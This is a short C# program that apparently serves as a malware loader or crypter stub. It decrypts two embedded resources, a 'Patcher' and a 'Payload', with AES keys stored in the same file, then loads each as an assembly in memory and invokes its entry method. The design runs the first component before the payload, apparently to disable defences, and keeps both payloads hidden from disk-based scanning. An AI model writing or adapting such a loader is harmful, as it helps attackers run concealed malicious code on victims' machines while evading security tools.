using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Reflection;
using System.Security.Cryptography;

namespace Starter
{
    internal class Entry
    {
       

        static void Main(string[] args)
        {
            Start();
        }

        public static void Start()
        {
#if DEBUG
            Console.WriteLine("Running Decoder.");
#endif

            var asm = Decrypt(Encoding.UTF8.GetString(Properties.Resources.Patcher), Properties.Resources.PatchKey);
            Execute(asm);
            asm = Decrypt(Encoding.UTF8.GetString(Properties.Resources.Payload), Properties.Resources.Key);
            Execute(asm);
        }

        private static byte[] Decrypt(string b64, string secretKey)
        {
            var src = Convert.FromBase64String(b64);
            var bytes = Encoding.UTF8.GetBytes(secretKey);

            byte[] key = bytes.Take(32).ToArray();
            byte[] iv = bytes.Take(16).ToArray();

            RijndaelManaged rijndael = new RijndaelManaged();
            rijndael.KeySize = 256;
            rijndael.BlockSize = 128;
            rijndael.Key = key;
            rijndael.IV = iv;
            rijndael.Padding = PaddingMode.PKCS7;

            byte[] decryptedBytes = rijndael.CreateDecryptor().TransformFinalBlock(src, 0, src.Length);
            return decryptedBytes;
        }

        private static void Execute(byte[] assemblyBytes)
        {
            var assembly = System.Reflection.Assembly.Load(assemblyBytes);
            var method = assembly.GetTypes().First(t => t.Name ==  "Entry").GetMethod("Start", BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic);
            method.Invoke(null, new object[] { });
        }
    }
}
